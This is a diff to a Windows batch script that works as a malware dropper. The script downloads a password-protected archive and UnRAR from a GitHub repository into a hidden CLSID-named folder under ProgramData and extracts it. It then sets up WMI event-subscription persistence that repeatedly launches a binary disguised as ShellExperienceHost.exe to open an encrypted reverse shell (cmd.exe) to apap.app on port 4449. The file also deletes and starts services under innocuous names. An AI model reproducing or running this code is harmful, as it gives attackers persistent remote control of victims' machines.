@@ -1,8 +1,8 @@
 sc delete Help
 schtasks /Delete /TN "\Windows\Help" /F
 mkdir %ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}
-%WINDIR%\System32\curl.exe -L -o "%ProgramData%\Comms\pac.rar" https://github.com/vlad213-tex/1/raw/1/1/insta.rar
-%WINDIR%\System32\curl.exe -L -o "%ProgramData%\Comms\UnRAR.exe" https://github.com/vlad213-tex/1/raw/1/1/UnRAR.exe
+%WINDIR%\System32\curl.exe -L -o "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\pac.rar" https://github.com/vlad213-tex/1/raw/1/1/insta.rar
+%WINDIR%\System32\curl.exe -L -o "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\UnRAR.exe" https://github.com/vlad213-tex/1/raw/1/1/UnRAR.exe
 
 "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\UnRAR.exe" x -y -o+ -p369852147 "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\insta.rar" "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\"
 
@@ -50,6 +50,5 @@ powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='MCS'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 200 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='MCS'; CommandLineTemplate='%ProgramData%\config..\ShellExperienceHost.exe --ssl apap.app 4449 -e cmd.exe'} | Out-Null"
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"MCS\"'; Consumer='CommandLineEventConsumer.Name=\"MCS\"'} | Out-Null"
-
 
 sc start Performance
